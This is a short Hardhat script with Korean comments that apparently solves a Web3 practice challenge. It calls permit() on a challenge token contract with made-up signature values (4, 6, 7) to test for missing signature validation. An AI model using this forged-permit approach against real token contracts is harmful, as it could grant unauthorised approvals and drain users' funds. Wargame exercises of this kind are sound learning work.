const { ethers } = require("hardhat");
const eth = ethers.BigNumber.from(10).pow(18);

async function permitERC20tokensol() {
  const [myAccount] = await ethers.getSigners();

  const instance = "0xc73101eAc732d11c0D467B2C3FDfFE0a9EaaD25A"; // 홈페이지에 나온 컨트랙트 주소

  console.log("finish");

  const ERC20Burnable1 = await ethers.getContractFactory(
    "Web3OJTPermitable" // 홈페이지에 나와있는 문제 코드
  );

  const ERC20burnable = ERC20Burnable1.attach(instance); // 배포한거에 홈페이지에 나온 컨트랙트 붙이기

  const num = ethers.BigNumber.from(20).mul(eth);
  console.log("cool");

  const result = await ERC20burnable.permit(
    myAccount.address,
    instance,
    num,
    1658469887,
    4,
    6,
    7
  );
  console.log("cool2");

  console.log(result);
}

async function main() {
  permitERC20tokensol();
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
